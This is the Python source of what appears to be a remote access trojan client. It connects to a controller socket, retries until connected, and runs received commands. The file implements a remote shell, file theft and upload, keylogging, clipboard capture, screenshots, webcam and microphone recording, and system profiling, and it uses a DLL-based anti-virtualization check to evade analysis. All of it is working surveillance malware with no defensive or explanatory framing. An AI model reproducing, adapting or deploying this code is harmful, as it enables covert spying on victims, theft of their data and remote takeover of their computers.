from socket import socket, AF_INET, SOCK_STREAM
from platform import system, release, version, machine, processor
from subprocess import Popen, PIPE, STDOUT
from threading import Thread
from queue import Queue
from time import sleep, monotonic
from os import path
from keyboard import read_key
from pyperclip import paste
from pyautogui import screenshot
from io import BytesIO
from cv2 import VideoCapture, imencode
from pyaudio import PyAudio, paInt16
from ctypes import WinDLL, c_bool
from struct import pack, unpack

def sendMsg(socket, msg):
    msg = pack('>I', len(msg)) + msg
    socket.sendall(msg)

def recvMsg(socket):
    rawMsgLen = recvAll(socket, 4)
    if not rawMsgLen:
        return None
    msgLen = unpack('>I', rawMsgLen)[0]
    return recvAll(socket, msgLen)

def recvAll(socket, bytes):
    data = bytearray()
    while len(data) < bytes:
        packet = socket.recv(bytes - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def CloseConnection():
    main.connection = False

def GetSystemInfo(socket):
    result = ("Platform: " + system() + "\n" + 
        "Platform release: " + release() + "\n" + 
        "Platform version: " + version() + "\n" + 
        "Architecture: " + machine() + "\n" + 
        "Processor: " + processor())
    sendMsg(socket, result.encode())

def CommandLineInterface(socket):

    def enqueueOutput(process, outQueue):
        for out in iter(process.stdout.readline, str):
            outQueue.put(out)

    platform = system()
    if platform == "Linux":
        defaultShell = ["/bin/sh"]
    elif platform == "Windows":
        defaultShell = ["cmd"]
    process = Popen(defaultShell, stdin = PIPE, stdout = PIPE, stderr = STDOUT, text = True)
    outputQueue = Queue()
    outputThread = Thread(target = enqueueOutput, args = (process, outputQueue))
    outputThread.daemon = True
    outputThread.start()
    while True:
        command = recvMsg(socket).decode()
        if command == "exit":
            process.terminate()
            break
        process.stdin.write(command + "\n")
        process.stdin.flush()
        sleep(3)
        result = ""
        while not outputQueue.empty():
            result += outputQueue.get_nowait()
        if not result:
            result = " "
        sendMsg(socket, result.encode())

def SendFile(socket, filepath):
    if path.exists(filepath):
        sendMsg(socket, "Success".encode())
        filesize = path.getsize(filepath)
        sendMsg(socket, str(filesize).encode())
        recvMsg(socket)
        file = open(filepath, "rb")
        data = file.read(1024)
        while data:
            sendMsg(socket, data)
            recvMsg(socket)
            data = file.read(1024)
        file.close()
    else:
        sendMsg(socket, "This path doen\'t exists".encode())

def GetFile(socket):
    filename = recvMsg(socket).decode()
    sendMsg(socket, "Success".encode())
    filesize = int(recvMsg(socket).decode())
    sendMsg(socket, "Success".encode())
    file = open(filename, "wb")
    actSize = 0
    while actSize < filesize:
        data = recvMsg(socket)
        sendMsg(socket, "Success".encode())
        actSize += 1024
        file.write(data)
    file.close()

def CaptureKeyboardInput(socket, seconds):
    result = ""
    endTime = monotonic() + int(seconds)
    while monotonic() < endTime:
        result += read_key()
    if result:
        sendMsg(socket, result.encode())
    else:
        sendMsg(socket, "Nothing".encode())

def GetClipboardInfo(socket):
    result = paste()
    if result:
        sendMsg(socket, result.encode())
    else:
        sendMsg(socket, "Nothing in clipboard".encode())

def TakeScreenshot(socket):
    rawScreenshot = screenshot()
    bufferScreenshot = BytesIO()
    rawScreenshot.save(bufferScreenshot, format = "PNG")
    bytesScreenshot = bufferScreenshot.getvalue()
    sendMsg(socket, bytesScreenshot)

def RecordVideo(socket, seconds):
    cap = VideoCapture(0)
    if cap.isOpened():
        sendMsg(socket, "Success".encode())
        endTime = monotonic() + int(seconds)
        bytesList = []
        while monotonic() < endTime:
            ret, frame = cap.read()
            bytesFrame = imencode('.jpg', frame)[1].tobytes()
            bytesList.append(bytesFrame)
        sendMsg(socket, str(len(bytesList)).encode())
        recvMsg(socket)
        for frame in bytesList:
            sendMsg(socket, frame)
            recvMsg(socket)
    else:
        sendMsg(socket, "Couldn\'t open default camera device".encode())
    cap.release()

def RecordAudio(socket, seconds):
    cap = PyAudio()
    stream = cap.open(format = paInt16, channels = 2, rate = 44100, input = True, frames_per_buffer = 1024)
    bytesList = []
    endTime = monotonic() + int(seconds)
    while monotonic() < endTime:
        frame = stream.read(1024)
        bytesList.append(frame)
    sendMsg(socket, str(len(bytesList)).encode())
    recvMsg(socket)
    for frame in bytesList:
        sendMsg(socket, frame)
        recvMsg(socket)
    stream.stop_stream()
    stream.close()
    cap.terminate()

def ProcessCommand(socket, command):
    if command[0] == "Exit":
        CloseConnection()
    elif command[0] == "GetSystemInfo":
        GetSystemInfo(socket)
    elif command[0] == "CommandLineInterface":
        CommandLineInterface(socket)
    elif command[0] == "GetFile":
        SendFile(socket, command[1])
    elif command[0] == "SendFile":
        GetFile(socket)
    elif command[0] == "CaptureKeyboardInput":
        CaptureKeyboardInput(socket, command[1])
    elif command[0] == "GetClipboardInfo":
        GetClipboardInfo(socket)
    elif command[0] == "TakeScreenshot":
        TakeScreenshot(socket)
    elif command[0] == "RecordVideo":
        RecordVideo(socket, command[1])
    elif command[0] == "RecordAudio":
        RecordAudio(socket, command[1])

def main():
    libFile = ".\\antivmDLL.dll"
    antivmDll = WinDLL(libFile)
    antivmDll.restype = c_bool
    checkVirtualization = antivmDll.CheckRegExisting()
    if checkVirtualization:
        HOST = "127.0.0.1"
        PORT = 6060

        cSocket = socket(AF_INET, SOCK_STREAM)
        while True:
            try:
                cSocket.connect((HOST, PORT))
                break
            except ConnectionRefusedError:
                continue
            except TimeoutError:
                continue
        main.connection = True

        while main.connection:
            command = recvMsg(cSocket).decode()
            ProcessCommand(cSocket, command.split())
    
main()